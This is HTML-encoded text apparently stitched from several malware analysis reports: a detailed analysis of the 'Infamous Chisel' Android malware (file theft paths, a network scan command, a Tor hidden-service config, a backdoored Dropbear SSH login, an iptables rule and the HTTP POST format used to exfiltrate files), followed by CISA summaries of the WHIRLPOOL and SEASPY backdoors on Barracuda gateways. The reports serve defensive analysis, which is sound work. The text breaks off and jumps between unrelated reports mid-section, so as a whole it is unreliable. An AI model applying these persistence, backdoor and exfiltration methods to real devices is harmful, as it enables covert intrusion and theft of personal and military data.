&lt;li&gt;&lt;code&gt;/data/data/eu.thedarken.wldonate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;h5&gt;Local Area Network Scanning&lt;/h5&gt;
&lt;p&gt;Every 172,000 seconds (1 day, 23 hours, 46 minutes, and 20 seconds) the local area network is scanned.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; has a built-in network scanner that is executed by the command line:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd minmap -i any -noping -o /data/local/tmp/.ndata.tmp/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The ping scanner is fairly simplistic and will iterate over the available host IP addresses in the subnet specified by the interface on all available Transmission Control Protocol (TCP) ports. Internet Control Message Protocol (ICMP) scanning is disabled due to the &lt;code&gt;noping&lt;/code&gt; command line parameter specified.&lt;/p&gt;
&lt;p&gt;The scanner also includes a HTTP GET request to elicit responses from ports running a HTTP server. The responses from other ports are also logged.&lt;/p&gt;
&lt;div&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; This information would facilitate lateral movement within the network and illustrates a clear intention to interact with other nearby hosts.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;On completion of this scan, the &lt;code&gt;.ndata.tmp&lt;/code&gt; file is moved to the filename &lt;code&gt;.ndata.csv&lt;/code&gt; in the same directory. This file is exfiltrated immediately, and both files removed from the tmp directory.&lt;/p&gt;
&lt;p&gt;The contents of this file will appear similar to:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;INTERFACE = eth0&lt;/p&gt;
&lt;p&gt;SOURCE = 192.168.0.2&lt;/p&gt;
&lt;p&gt;IP begin = 192.168.0.0&lt;/p&gt;
&lt;p&gt;IP end = 192.168.0.255&lt;/p&gt;
&lt;p&gt;PORTS =&lt;/p&gt;
&lt;p&gt;PING off&lt;/p&gt;
&lt;p&gt;SCAN tcp&lt;/p&gt;
&lt;p&gt;*******start*scan********&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Host 192.168.0.0:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.1:&lt;/p&gt;
&lt;p&gt;tcp - 135:[&lt;/p&gt;
&lt;p&gt;tcp - 139:[&lt;/p&gt;
&lt;p&gt;tcp - 443:[&lt;/p&gt;
&lt;p&gt;tcp - 445:[&lt;/p&gt;
&lt;p&gt;Host 192.168.0.2:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.3:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.4:&lt;/p&gt;
&lt;p&gt;&amp;lt;Remaining hosts omitted for brevity&amp;gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The following command line parameters are present, but only a small portion is used:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;-ip, -p, -o, -i, -noping, -udp, -n, -s, -t, -c, -h, --help&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Command line help is also included:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;Usage minmap -ip* &amp;lt;ip-addr: 192.168.0.1/ip-range: 192.168.0.0/24&amp;gt; -p* &amp;lt;port: 80/port-range: 22,25-125/top&amp;gt; -udp &amp;lt;default tcp&amp;gt; -noping &amp;lt;default yes&amp;gt; -o &amp;lt;out_file&amp;gt; -t &amp;lt;timeout&amp;gt; &amp;lt;-n&amp;gt; -c &amp;lt;try_count&amp;gt; -s &amp;lt;source ip&amp;gt; -i &amp;lt;interface/any&amp;gt; &amp;lt;-h/--help (print this help)&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;td&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;td&lt;/code&gt; utility provides Tor directory services and is compiled for ARM with no obvious modifications. The configuration for this is generated by the &lt;code&gt;blob&lt;/code&gt; component, used for Tor management, described in the Components (blob) section, and saved at the path &lt;code&gt;/data/local/prx.cfg&lt;/code&gt;. This file contains:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;SocksPort 127.0.0.1:1129 PreferSOCKSNoAuth%sExitPolicy reject *:*&lt;/p&gt;
&lt;p&gt;DataDirectory /data/local/prx/&lt;/p&gt;
&lt;p&gt;RunAsDaemon 1&lt;/p&gt;
&lt;p&gt;HiddenServiceDir /data/local/prx/hs/&lt;/p&gt;
&lt;p&gt;HiddenServicePort 34371 127.0.0.1:34371&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;This configuration provides a Socket Secure version 4 (SOCKS4) connection on the local port &lt;code&gt;1129&lt;/code&gt; enabling the Tor network to be used. The &lt;code&gt;blob&lt;/code&gt; component uses this for network connectivity checks.&lt;/p&gt;
&lt;p&gt;The hidden service port is set to &lt;code&gt;34371&lt;/code&gt; with the directory for hidden service information being set to &lt;code&gt;/data/local/prx/hs/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;During the execution of &lt;code&gt;td&lt;/code&gt; an &lt;code&gt;.onion&lt;/code&gt; domain for a hidden service is randomly generated at the path &lt;code&gt;/data/local/prx/hs/hostname&lt;/code&gt; which is then exfiltrated by &lt;code&gt;netd&lt;/code&gt;. The &lt;code&gt;db&lt;/code&gt; component performs further configuration detailed in the Multi-call binaries (Watchdog&lt;u&gt;)&lt;/u&gt;&amp;nbsp;section of this report to enable a SSH connection via this &lt;code&gt;.onion&lt;/code&gt; domain. This gives the actor the ability to create an SSH session by connecting to the hidden service across Tor.&lt;/p&gt;
&lt;h3&gt;blob&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;blob&lt;/code&gt; component is responsible for configuring Tor services and checking network connectivity. Every 15 seconds the &lt;code&gt;tmp&lt;/code&gt; directory is checked for the &lt;code&gt;blob&lt;/code&gt; utility, and if found, it is moved to the &lt;code&gt;/data/local&lt;/code&gt; directory from the &lt;code&gt;/data/local/tmp/blob&lt;/code&gt; directory, overwriting any existing version. Every 6,000 seconds (1 hour and 40 minutes) &lt;code&gt;blob&lt;/code&gt; is then run from the &lt;code&gt;/data/local&lt;/code&gt; directory.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; executes &lt;code&gt;blob&lt;/code&gt; which is responsible for configuring and executing Tor services provided by &lt;code&gt;td&lt;/code&gt;. When run, it performs the following actions:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Checks local host for the port &lt;code&gt;1129&lt;/code&gt; being open, exiting if it is.&lt;/li&gt;
&lt;li&gt;Checks for the existence of &lt;code&gt;/data/local/td&lt;/code&gt;. If this is not present, extracts it from &lt;code&gt;/data/local/td.bz2&lt;/code&gt; (bzip2 compressed data).&lt;/li&gt;
&lt;li&gt;Creates the configuration file at the path: &lt;code&gt;/data/local/prx.cfg&lt;/code&gt;.&amp;nbsp;The contents of which are detailed in the Components (td)&amp;nbsp;section above.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;td&lt;/code&gt; is executed with this configuration file being supplied with the &lt;code&gt;-f&lt;/code&gt; command line parameter: &lt;code&gt;/data/local/td -f /data/local/prx.cfg&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;db&lt;/code&gt; the modified Dropbear SSH utility is checked for at the path &lt;code&gt;/data/local/db&lt;/code&gt;. If this file is not present, it is extracted from &lt;code&gt;/data/local/db.bz2&lt;/code&gt;. db is then executed immediately after, with no command line parameters being passed.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;blob&lt;/code&gt; then enters a loop where it performs a network connectivity check against the domain &lt;code&gt;www.geodatatool[.]com&lt;/code&gt; connecting on the local SOCKS4 address provided by the td utility &lt;code&gt;127.0.0[.]1:1129&lt;/code&gt; every 3 minutes.&lt;/li&gt;
&lt;li&gt;It checks the second byte of the response from this domain to be the character &lt;code&gt;Z (0x5a)&lt;/code&gt; to validate a legitimate response has been received from the server. Nothing further is done with the data; this is simply an internet connection check.&lt;/li&gt;
&lt;li&gt;If this request fails or the server doesn’t return the expected data, &lt;code&gt;blob&lt;/code&gt; terminates the execution of &lt;code&gt;td&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;tcpdump&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;tcpdump&lt;/code&gt; utility (version &lt;code&gt;4.1.1&lt;/code&gt;) is compiled for ARM with no obvious modifications. This provides traffic capturing and monitoring functionality via the command line.&lt;/p&gt;
&lt;h3&gt;Multi-call binaries: db, NDBR_armv7l and NDBR_i686&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;db&lt;/code&gt; utility contains multiple individual utilities which are selected based on the command line parameters supplied:&lt;/p&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;

&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Creates directories&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The command line help for &lt;code&gt;dropbear&lt;/code&gt;, &lt;code&gt;dropbearkey&lt;/code&gt;, &lt;code&gt;nmap&lt;/code&gt; and &lt;code&gt;scp&lt;/code&gt; can be found in the Appendix&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dropbear&lt;/code&gt;, present within &lt;code&gt;db&lt;/code&gt;, provides secure shell access to the device via the Tor hidden service. IP Tables rules configured allow incoming TCP connections destined for port &lt;code&gt;34371&lt;/code&gt; through the firewall. The Tor utility executed by &lt;code&gt;blob&lt;/code&gt; on the device is configured to provide a hidden service on this port, then forward connections to the local &lt;code&gt;dropbear&lt;/code&gt; instance. The &lt;code&gt;.onion&lt;/code&gt; address has already been exfiltrated enabling the actor to connect to it. Modifications have been made to &lt;code&gt;dropbear&lt;/code&gt; authentication mechanisms.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;scp&lt;/code&gt; utility does not appear to have been modified. The &lt;code&gt;nmap&lt;/code&gt; utility has the same functionality as the version in &lt;code&gt;netd&lt;/code&gt; but is executed manually by actor interaction.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;watchdog&lt;/code&gt;, &lt;code&gt;rmflag&lt;/code&gt;, and &lt;code&gt;mkflag&lt;/code&gt; utilities appear to be additional actor-created code that has been incorporated to perform some configuration for &lt;code&gt;dropbear&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The directory &lt;code&gt;sessions.log.d&lt;/code&gt; is created under &lt;code&gt;/data/local/tmp/&lt;/code&gt;, and puts all standard Dropbear files under this directory alongside the custom actor file &lt;code&gt;remove_file.flag&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;Watchdog&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;watchdog&lt;/code&gt; utility performs setup and executes &lt;code&gt;dropbear&lt;/code&gt;. This setup includes:&lt;/p&gt;
&lt;h5&gt;File and directory creation&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/remove_file.flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;code&gt;remove_file.flag&lt;/code&gt;&amp;nbsp;file is created containing the string &lt;code&gt;run&lt;/code&gt; when any of the multi-call utilities run Dropbear. This will be collected and exfiltrated by&amp;nbsp;&lt;code&gt;netd&lt;/code&gt;&amp;nbsp;giving the actor an indicator that the SSH server is active.&lt;/p&gt;
&lt;h5&gt;Authorized hosts setup&lt;/h5&gt;
&lt;p&gt;A host key is placed into the directory:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/authorized_keys&lt;/code&gt;&lt;/p&gt;
&lt;h5&gt;IP Tables Rules&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;/usr/sbin/iptables&lt;/code&gt; is executed with the parameters:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-A INPUT -p tcp --dport 34371 -j ACCEPT -I&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;mkflag&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;mkflag&lt;/code&gt; utility creates the directories and files that &lt;code&gt;watchdog&lt;/code&gt; creates but does not perform any host file or IP table manipulation, and then runs &lt;code&gt;dropbear&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;rmflag&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;rmflag&lt;/code&gt; utility deletes &lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/remove_file.flag&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;Modified Dropbear functions&lt;/h4&gt;
&lt;p&gt;The actor has modified authentication mechanisms in Dropbear.&lt;/p&gt;
&lt;h5&gt;fill_passwd&lt;/h5&gt;
&lt;p&gt;The Dropbear function &lt;code&gt;fill_passwd&lt;/code&gt; is used to verify that a supplied username is a valid account and return information required to process authentication.&lt;/p&gt;
&lt;p&gt;The unmodified source code for this can be found in the Appendix (Dropbear fill_passwd function)&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;This function calls multiple Linux library functions, &lt;code&gt;getpwnam&lt;/code&gt;, &lt;code&gt;getspnam&lt;/code&gt;, &lt;code&gt;getpwuid&lt;/code&gt;, but in the modified version actor replacement functions are called instead, each of these are discussed below.&lt;/p&gt;
&lt;h5&gt;getpwnam&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getpwnam&lt;/code&gt; Linux library function accepts a username and cross-references it with the passwd file usually stored at &lt;code&gt;/etc/passwd&lt;/code&gt; for the corresponding entry containing the colon concatenated fields:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;username&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user password&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user ID&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;group ID&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user information&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;home directory&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shell program&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;On most modern systems, an &lt;code&gt;x&lt;/code&gt; in the &lt;code&gt;user password&lt;/code&gt; field is used to denote that the password hash is stored in the &lt;code&gt;/etc/shadow&lt;/code&gt; file that requires root privileges to read. On an Android device, there are typically no such files, so the structure that would usually be retrieved from the &lt;code&gt;passwd&lt;/code&gt; file is generated instead.&lt;/p&gt;
&lt;p&gt;The actor has replaced this function with their own, where if a particular username is seen it returns a hard-coded response. If the expected username is not seen, the &lt;code&gt;/etc/passwd&lt;/code&gt; file is checked for the corresponding username as normal.&lt;/p&gt;
&lt;h5&gt;getpwuid&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getpwuid&lt;/code&gt; Linux library accepts a uid and returns the corresponding structure above typically from the &lt;code&gt;/etc/passwd&lt;/code&gt; file. The actor has replaced this function to check for the &lt;code&gt;uid&lt;/code&gt; of &lt;code&gt;0xbeef&lt;/code&gt; and return the hard-coded structure detailed above, if found. If &lt;code&gt;0xbeef&lt;/code&gt; is not seen, it will revert to checking &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
&lt;h5&gt;getspnam&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getspnam&lt;/code&gt; Linux library function accepts a username and cross-references it with the shadow file usually stored at &lt;code&gt;/etc/shadow&lt;/code&gt; for the corresponding entry that contains the dollar concatenated fields:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;salt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hash&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Typically, on an Android device, this function would return NULL, but the actor replacement function uses the Linux version.&lt;/p&gt;
&lt;p&gt;There does not appear to be any modifications other than those detailed above, but there may be other patches implemented.&lt;/p&gt;
&lt;h4&gt;NDBR&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;NDBR_armv7l&lt;/code&gt; and &lt;code&gt;NDBR_i686&lt;/code&gt; utilities contain multiple individual utilities compiled for ARM and x86 respectively. They both include the above authentication mechanism modification, although with different credentials, and otherwise appear to be the same.&lt;/p&gt;
&lt;p&gt;These utilities also have some functionality overlap with the &lt;code&gt;VPNFilter&lt;/code&gt; malware but appear to be an evolution.&lt;a href="https://www.cisa.gov//blog.talosintelligence.com/vpnfilter-part-3/"&gt;[1]&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;killer&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;killer&lt;/code&gt; is a simple program, the main purpose of which is to terminate &lt;code&gt;netd&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It achieves this by performing the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Iterates through all Process Identifiers (PIDs) in the range 2 through to &lt;code&gt;0x3FFFFF&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the first line of &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/status&lt;/code&gt; for the string &lt;code&gt;netd&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the target of the link referenced at &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/exe&lt;/code&gt; against &lt;code&gt;netd&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the executable name is not &lt;code&gt;netd_&lt;/code&gt; (The legitimate backup executed by the malicious &lt;code&gt;netd&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Terminates the malicious netd leaving the legitimate &lt;code&gt;netd_&lt;/code&gt; running.&lt;/li&gt;
&lt;/ol&gt;
&lt;div&gt;
&lt;h2&gt;Communications&lt;/h2&gt;
&lt;/div&gt;
&lt;h3&gt;netd file exfiltration&lt;/h3&gt;
&lt;p&gt;When a file is to be exfiltrated, a Transport Layer Security (TLS) connection is initiated to a hard-coded local IP and port.&lt;/p&gt;
&lt;div&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; This local IP address is likely a local port forward to relay the network traffic over a secure channel, such as a Virtual Private Network (VPN) configured on the device. VPN services are often configured in this way, giving the actor a means to exfiltrate information from the network which blends in with expected encrypted network traffic.&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;If a connection to the local IP and port fails, a hard-coded domain is used as a fallback connection. The IP address for this domain is resolved using a request to &lt;code&gt;dns.google&lt;/code&gt;.&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;POST /dns-query HTTP/1.1&lt;/p&gt;
&lt;p&gt;Host: dns.google&lt;/p&gt;
&lt;p&gt;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0&lt;/p&gt;
&lt;p&gt;Accept: application/dns-message&lt;/p&gt;
&lt;p&gt;Content-Type: application/dns-message&lt;/p&gt;
&lt;p&gt;Content-Length:&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; The hard-coded user agent that relates to a Microsoft Windows operating system would raise suspicion originating from an Android device. But since all the communications are under TLS, it would make inspecting the HTTP headers difficult.&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;The following HTTP Post request is used to exfiltrate data:&lt;/p&gt;
&lt;div&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope="col"&gt;
&lt;p&gt;&lt;strong&gt;Data structure&lt;/strong&gt;&lt;/p&gt;
&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;POST /server.php?ver=16&amp;amp;&lt;strong&gt;bid&lt;/strong&gt;=%s&amp;amp;&lt;strong&gt;type&lt;/strong&gt;=%d HTTP/1.1&lt;/p&gt;
&lt;p&gt;User-Agent: curl/7.47&lt;/p&gt;
&lt;p&gt;Host:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Path&lt;/strong&gt;: %s&lt;/p&gt;
&lt;p&gt;Content-Type: application/octet-stream&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Length&lt;/strong&gt;: %d&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;Raw File&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;Android ID&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Type: 0 or 1&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Base64 encoded file path&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;Content Length of the encoded file to be exfiltrated&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;File contents&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;&amp;nbsp;The Android ID is generated by the initial script run, using the command &lt;code&gt;settings get secure android_id&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Type&lt;/code&gt; denotes the exfiltration type:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt; is used for the file searches, triage script and configurations files.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt; is used for other information such as the Tor domain.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The Infamous Chisel components are low to medium sophistication and appear to have been developed with little regard to defense evasion or concealment of malicious activity.&lt;/p&gt;
&lt;p&gt;The searching of specific files and directory paths that relate to military applications and exfiltration of this data reinforces the intention to gain access to these networks. Although the components lack basic obfuscation or stealth techniques to disguise activity, the actor may have deemed this not necessary, since many Android devices do not have a host-based detection system.&lt;/p&gt;
&lt;p&gt;Two interesting techniques are present in Infamous Chisel:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the replacement of the legitimate &lt;code&gt;netd&lt;/code&gt; executable to maintain persistence.&lt;/li&gt;
&lt;li&gt;the modification of the authentication function in the components that include &lt;code&gt;dropbear&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These techniques require a good level of C++ knowledge to make the alterations and an awareness of Linux authentication and boot mechanisms.&lt;/p&gt;
&lt;p&gt;Even with the lack of concealment functions, these components present a serious threat because of the impact of the information they can collect.&lt;/p&gt;
&lt;div&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;div class="cma-section"&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained a variant of the WHIRLPOOL backdoor. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			WHIRLPOOL is a backdoor that establishes a Transport Layer Security (TLS) reverse shell to the Command-and-Control (C2) server.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload and other backdoors, see CISA Alert: CISA Releases Malware Analysis Reports on Barracuda Backdoors.&lt;/p&gt;

&lt;p&gt;The file 'ssld' is a Linux ELF reverse shell and is a variant of WHIRLPOOL malware used on the Barracuda Email Security Gateway (ESG) device (Figure 1). The file looks for an encoded string with a '.io' extension (Figure 2). The string will be decoded and the data will be passed as the C2 which will include the Internet Protocol (IP) address and port number used to establish a reverse shell.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;div class="cma-section"&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained four malware samples - including SEASPY and WHIRLPOOL backdoors. The device was compromised by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			SEASPY is a persistent and passive backdoor that masquerades as a legitimate Barracuda service “BarracudaMailService” that allows the threat actors to execute arbitrary commands on the ESG appliance.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			WHIRLPOOL is a backdoor that establishes a Transport Layer Security (TLS) reverse shell to the Command-and-Control (C2) server.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload, a second SEASPY backdoor variant, and the SUBMARINE backdoor, see CISA Alert: &lt;a href="https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors"&gt;CISA Releases Malware Analysis Reports on Barracuda Backdoors&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit Executable and Linkable Format (ELF) file that has been identified as a "SEASPY" malware variant installed as a system service. The malware is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the Threat Actor's (TA's) C2 through TCP packets. When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (Simple Mail Transfer Protocol (SMTP)) and TCP port 587. It checks the network packet captured for a hard-coded string "oXmp". When the right sequence of packets is captured, it establishes a TCP reverse shell to the TA's C2 server for further exploitation. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin argument--&lt;br /&gt;&lt;br /&gt;
			Usage: "./BarracudaMailService &amp;lt;Network-Interface&amp;gt;"&lt;br /&gt;&lt;br /&gt;
			Sample: "./&amp;lt;malware&amp;gt; eth0"&lt;br /&gt;&lt;br /&gt;
